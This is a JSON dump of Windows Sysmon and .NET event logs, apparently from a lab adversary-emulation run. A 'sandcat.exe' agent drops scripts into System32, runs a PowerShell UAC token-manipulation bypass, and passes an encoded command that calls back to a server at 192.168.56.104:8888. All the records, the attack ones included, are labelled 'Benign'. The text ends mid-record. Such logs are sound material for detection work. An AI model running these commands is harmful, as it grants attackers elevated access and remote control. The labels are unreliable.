{"@timestamp":"2022-03-23T11:17:04.508Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: -\nUtcTime: 2022-03-23 11:17:04.508\nProcessGuid: {04787c88-01ae-623b-f001-000000000c00}\nProcessId: 5596\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive\nCreationUtcTime: 2020-09-26 20:35:42.672\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5596,"thread":null,"entity_id":"{04787c88-01ae-623b-f001-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":9252,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:05.552Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:30.594Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Application: powershell.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.AccessViolationException\n   at System.Runtime.InteropServices.Marshal.ReadByte(IntPtr, Int32)\n   at DynamicClass.CallSite.Target(System.Runtime.CompilerServices.Closure, System.Runtime.CompilerServices.CallSite, System.Type, System.Object)\n   at System.Management.Automation.Interpreter.DynamicInstruction`3[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipeImpl(System.Management.Automation.ScriptBlockClauseToInvoke, Boolean, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, System.Object[])\n   at System.Management.Automation.ScriptBlock+<>c__DisplayClass57_0.<InvokeWithPipe>b__0()\n   at System.Management.Automation.Runspaces.RunspaceBase.RunActionIfNoRunningPipelinesWithThreadCheck(System.Action)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipe(Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, Boolean, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Object[])\n   at System.Management.Automation.ScriptBlock.InvokeUsingCmdlet(System.Management.Automation.Cmdlet, Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Object[])\n   at Microsoft.PowerShell.Commands.ForEachObjectCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.Pipe.AddToPipe(System.Object)\n   at System.Security.SecurityContext.Run(System.Security.SecurityContext, System.Threading.ContextCallback, System.Object)\n   at System.Management.Automation.MshCommandRuntime.WriteObject(System.Object)\n   at System.Management.Automation.Cmdlet.WriteObject(System.Object)\n   at Microsoft.PowerShell.Commands.GetProcessCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.PSScriptCmdlet.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.PSScriptCmdlet.DoEndProcessing()\n   at System.Management.Automation.CommandProcessorBase.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeHelper()\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeThreadProc()\n   at System.Management.Automation.Runspaces.PipelineThread.WorkerProc()\n   at System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object)\n   at System.Threading.ThreadHelper.ThreadStart()","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":null,"winlog":{"channel":"Application","event_id":"1026","api":"wineventlog","record_id":463,"computer_name":"win10.windomain.local","provider_name":".NET Runtime","provider_guid":null,"keywords":["Classic"],"event_data":{"param2":null,"param1":"Application: powershell.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.AccessViolationException\n   at System.Runtime.InteropServices.Marshal.ReadByte(IntPtr, Int32)\n   at DynamicClass.CallSite.Target(System.Runtime.CompilerServices.Closure, System.Runtime.CompilerServices.CallSite, System.Type, System.Object)\n   at System.Management.Automation.Interpreter.DynamicInstruction`3[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipeImpl(System.Management.Automation.ScriptBlockClauseToInvoke, Boolean, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, System.Object[])\n   at System.Management.Automation.ScriptBlock+<>c__DisplayClass57_0.<InvokeWithPipe>b__0()\n   at System.Management.Automation.Runspaces.RunspaceBase.RunActionIfNoRunningPipelinesWithThreadCheck(System.Action)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipe(Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, Boolean, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Object[])\n   at System.Management.Automation.ScriptBlock.InvokeUsingCmdlet(System.Management.Automation.Cmdlet, Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Object[])\n   at Microsoft.PowerShell.Commands.ForEachObjectCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.Pipe.AddToPipe(System.Object)\n   at System.Security.SecurityContext.Run(System.Security.SecurityContext, System.Threading.ContextCallback, System.Object)\n   at System.Management.Automation.MshCommandRuntime.WriteObject(System.Object)\n   at System.Management.Automation.Cmdlet.WriteObject(System.Object)\n   at Microsoft.PowerShell.Commands.GetProcessCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.PSScriptCmdlet.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.PSScriptCmdlet.DoEndProcessing()\n   at System.Management.Automation.CommandProcessorBase.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeHelper()\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeThreadProc()\n   at System.Management.Automation.Runspaces.PipelineThread.WorkerProc()\n   at System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object)\n   at System.Threading.ThreadHelper.ThreadStart()"}},"event":{"kind":"event","provider":".NET Runtime","created":"2022-03-23T11:17:30.760Z","code":"1026"},"log":{"level":"error"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.698Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:17:29.698\nProcessGuid: {04787c88-fdd6-623a-7601-000000000c00}\nProcessId: 4192\nImage: C:\\Users\\Public\\sandcat.exe\nTargetFilename: C:\\Windows\\System32\\update.ps1\nCreationUtcTime: 2022-03-23 11:17:29.698\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4192,"thread":null,"entity_id":"{04787c88-fdd6-623a-7601-000000000c00}","executable":"C:\\Users\\Public\\sandcat.exe","name":"sandcat.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":9253,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.700Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:17:29.700\nProcessGuid: {04787c88-fdd6-623a-7601-000000000c00}\nProcessId: 4192\nImage: C:\\Users\\Public\\sandcat.exe\nTargetFilename: C:\\Windows\\System32\\Invoke-BypassUACTokenManipulation.ps1\nCreationUtcTime: 2022-03-23 11:17:29.700\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4192,"thread":null,"entity_id":"{04787c88-fdd6-623a-7601-000000000c00}","executable":"C:\\Users\\Public\\sandcat.exe","name":"sandcat.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":9254,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.703Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:17:29.703\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\\\"Import-Module $env:APPDATA\\update.ps1;update('http://192.168.56.104:8888')\\\"));Invoke-BypassUACTokenManipulation -Arguments \\\"-nop -exec bypass -EncodedCommand $pcode\\\" -Verbose\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-fdd6-623a-7601-000000000c00}\nParentProcessId: 4192\nParentImage: C:\\Users\\Public\\sandcat.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.exe\" -server http://192.168.56.104:8888 -group diy_eval\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 